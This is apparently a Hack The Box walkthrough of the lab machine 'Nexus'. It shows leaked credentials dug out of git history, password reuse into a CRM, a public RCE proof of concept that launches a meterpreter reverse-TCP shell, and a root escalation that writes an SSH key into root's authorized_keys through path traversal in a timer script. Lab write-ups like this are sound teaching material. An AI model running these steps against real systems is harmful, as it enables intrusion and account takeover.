# HTB – Nexus | Linux | Medium

## Recon
```bash
nmap nexus.htb
```
**Revealed Ports:**
```
22/tcp open  ssh
80/tcp open  http
```
Only ssh + http open. Started fuzzing for subdomains/directories in the background while looking at the site.

---

## Web Enumeration — Port 80
The site is for an energy company. It has a job portal, so I sent in an "application" with a CV link pointing to a server I controlled — hoping someone on staff would open it and leak a callback (didn't pan out this time).

Vhost fuzzing found two subdomains worth digging into:
```
git                     [Status: 200]
billing                 [Status: 302]
```

---

## Gitea Recon — git.nexus.htb
Running **Gitea 1.26.0**. A few known CVEs for this version:
- `CVE-2026-28737` — Stored XSS in the 3D file viewer
- `CVE-2026-22555` — Leaks org secrets via a flaw in the API fork flow
- `CVE-2026-27780` — Lets you bypass branch protection

None of these ended up being the way in — the real find was just browsing repos.

Directory fuzz on Gitea:
```
v2                      [Status: 401]
Admin                   [Status: 200]
jones                   [Status: 200]
```

The `jones` user had a repo for a **Krayin CRM** project. Browsing the commit history (not just the current files!) turned up an old `.env` that had since been "deleted" but was still sitting in git history:
```
DB_USERNAME=krayin
DB_PASSWORD=N27xh!!****
```
There was also a `docker-compose.yml` confirming the stack: Krayin app + MySQL + phpMyAdmin.

---

## Initial Access — Krayin CRM (billing.nexus.htb)
The CRM login only asks for an **email**, no username field. Tried logging in with the leaked DB credentials directly — didn't work, since those are database creds, not app-login creds.

Then I remembered a manager's email I'd picked up way earlier during recon: **j.matthew@nexus.htb**. Paired that email with the leaked DB password (people reuse passwords across services all the time) — and it logged straight into the dashboard.

The CRM was version **2.2.0**, which has a known RCE: `CVE-2026-38528`.
PoC: https://github.com/NathanHimself/CVE-2026-38526-PoC
```bash
python3 exploit.py -t <target URL> -u <email> -p <password> -c <command>
```
Used this to launch a `linux/x64/meterpreter/reverse_tcp` payload through msfconsole → got a shell on the box.

---

## User — krayin → jones
Ran `linpeas.sh` to look for easy wins, and it surfaced local **MySQL credentials** for a `krayin` DB user. Logged into MySQL and dumped the users table:
```sql
select * from users;
```
This gave a bcrypt password hash for `james (j.matthew)` — too strong to crack in reasonable time. So instead, I just tried that same MySQL password against the box's other Linux user, **jones** (password reuse again) — and it worked.
```bash
cat user.txt
```

---

## Privilege Escalation — jones → root
Found a systemd timer, `gitea-template-sync.timer`, that runs every ~1 minute as **root**. It runs a script (`template-sync.py`) which pulls files from any Gitea repo marked as a **Template** using `git ls-tree`.

The bug: the script builds file paths with Python's `os.path.join()`, which doesn't stop you from "escaping" the intended folder if your path starts climbing up with `../../`. So if a file in the template repo is named something like `../../../../root/.ssh/authorized_keys`, the script happily writes its contents there — as root. In short: **whatever SSH key you put in that file path gets added to root's authorized_keys automatically.**

### Manual Steps
```bash
# 1. add a hosts entry so git.nexus.htb resolves
echo "<target-ip> nexus.htb git.nexus.htb" >> /etc/hosts

# 2. generate a throwaway SSH keypair
ssh-keygen -t ed25519 -f /tmp/.k -N ''

# 3. create a "Template" repo on Gitea as jones
curl -s -X POST "http://git.nexus.htb/api/v1/user/repos" \
    -u "jones:y27xb****" \
    -H "Content-Type: application/json" \
    -d '{"name":"RCE","template":true,"auto_init":false}'

# 4. clone it, then build the malicious file tree
#    (this script creates the file with the path-traversal name
#     containing your public key)
git clone http://jones:y27xb****@git.nexus.htb/jones/RCE.git /tmp/rce
cd /tmp/rce
python3 /tmp/build.py

# 5. push it up
git push http://jones:y27xb****@git.nexus.htb/jones/RCE.git main --force

# 6. wait ~1 min for the timer to fire, then confirm
cat /var/log/template-sync.log

# 7. ssh in as root using your throwaway key
ssh -i /tmp/.k -o StrictHostKeyChecking=no root@nexus.htb
```

Wrote a script to automate the whole repo-build + push step: https://github.com/Aditya-k-Jangid/Scripts/blob/main/nexus_priv-esc.py

```bash
cat root.txt
```

Rating : 4/5

---
ROOTED.
